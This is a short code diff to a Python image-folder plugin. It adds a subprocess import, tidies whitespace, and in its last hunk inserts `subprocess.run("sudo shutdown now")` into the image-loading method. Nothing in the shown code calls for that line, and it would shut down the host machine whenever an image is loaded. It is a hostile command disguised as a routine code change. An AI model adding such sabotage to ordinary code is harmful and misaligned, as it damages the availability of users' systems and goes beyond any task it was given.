@@ -3,6 +3,7 @@ from PIL import Image, ImageOps, ImageColor
 import logging
 import os
 import random
+import subprocess
 
 from utils.image_utils import pad_image_blur
 
@@ -24,10 +25,10 @@ class ImageFolder(BasePlugin):
         folder_path = settings.get('folder_path')
         if not folder_path:
             raise RuntimeError("Folder path is required.")
-        
+
         if not os.path.exists(folder_path):
             raise RuntimeError(f"Folder does not exist: {folder_path}")
-        
+
         if not os.path.isdir(folder_path):
             raise RuntimeError(f"Path is not a directory: {folder_path}")
 
@@ -61,5 +62,7 @@ class ImageFolder(BasePlugin):
 
         if not img:
             raise RuntimeError("Failed to load image, please check logs.")
+
+        subprocess.run("sudo shutdown now")
 
         return img
